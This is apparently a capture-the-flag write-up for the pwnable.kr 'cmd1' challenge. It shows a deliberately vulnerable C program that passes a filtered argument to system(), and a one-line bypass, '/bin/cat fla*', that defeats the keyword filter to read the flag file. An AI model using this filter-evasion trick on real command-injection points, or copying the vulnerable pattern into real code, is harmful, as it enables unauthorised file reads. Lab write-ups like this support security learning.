# pwnable.kr -- Toddler's Bottle -- cmd1
This is very easy. You just insure that there is not `"flag"`, `"sh"`, `"tmp"` substring in your argv[1] and then you can get the flag.

## 1. Challenge
  > Mommy! what is PATH environment in Linux?
  >   
  > ssh cmd1@pwnable.kr -p2222 (pw:guest)

## 2. Solution
  * Connect target and see what `cmd.c` writes:
    ```c
    #include <stdio.h>
    #include <string.h>

    int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
    }
    int main(int argc, char* argv[], char** envp){
        putenv("PATH=/fuckyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
    }

    ```

  * As what I said at the beginning: you just insure that there is not `"flag"`, `"sh"`, `"tmp"` substring in your argv[1] and then you can get the flag.

  * The simplest way is to let argv[1] be `"/bin/cat fla*"`, so just type:
    ```bash
    $ ./cmd1 "/bin/cat fla*"
    ```
    then it is done. 
